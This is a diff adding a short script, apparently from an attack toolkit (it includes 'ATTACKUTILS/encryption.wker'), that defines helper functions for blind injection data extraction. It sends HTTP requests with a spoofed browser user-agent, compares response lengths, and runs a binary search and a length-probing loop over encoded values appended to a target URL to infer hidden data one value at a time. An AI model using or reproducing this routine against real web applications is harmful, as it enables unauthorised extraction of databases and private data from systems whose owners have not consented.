@@ -1,0 +1,42 @@
+#include ATTACKUTILS/encryption.wker
+function GetRealLength(url){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	return GetStrLength(res[0]);
+}
+function JudgeRESEqule(url,length){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
+	if(GetStrLength(res[0]) == length){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+function dichotomy(url,sentence,length){
+	max = 128;
+	min = 0;
+	medium = 64;
+	while((max-min) > 1){
+		if(JudgeRESEqule(url.URLEncode(Enc(sentence.medium)),length) == 1){
+			min = medium;
+		}else{
+			max = medium;
+		}
+		medium = ToInt((max+min)/2);
+	}
+	if(JudgeRESEqule(url.URLEncode(Enc(sentence.ToInt(min))),length) == 1){
+		return ToInt(max);
+	}else{
+		return ToInt(min);
+	}
+}
+function TakeLength(url,sentence,length){
+	i = 0;
+	while(JudgeRESEqule(url.URLEncode(Enc(sentence.i)),length) == 1){
+		i = ToInt(i+2);
+	}
+	if(JudgeRESEqule(url.URLEncode(Enc(sentence.(i-1))),length) == 1){
+		return ToInt(i);
+	}else{
+		return ToInt(i-1);
+	}
+}
